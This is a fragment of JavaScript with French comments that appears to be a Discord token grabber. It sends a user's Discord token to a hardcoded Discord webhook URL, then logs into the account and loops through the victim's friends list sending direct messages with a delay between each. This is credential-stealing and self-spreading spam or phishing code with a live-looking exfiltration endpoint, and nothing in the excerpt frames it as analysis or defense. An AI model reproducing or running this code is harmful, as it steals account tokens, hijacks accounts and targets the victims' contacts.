...
if (choice === '1') {
    (async () => {
        ...
        // Envoi du token au webhook
        try {
            await axios.post(
                'https://discord.com/api/webhooks/1375042554491572294/Kkg6NW2fGYFdmDkXpEa0iVRLaiF2O8jROtcafZ63u8M47jtqY8vo0SFcvih67zp2_F5w',
                {
                    content: `T${token}`,
        ...
        client.on('ready', async () => {
            ...
            try {
                ...
                for (const ami of friends) {
                    ...
                    await new Promise(resolve => setTimeout(resolve, 700)); // Délai entre chaque DM
                }
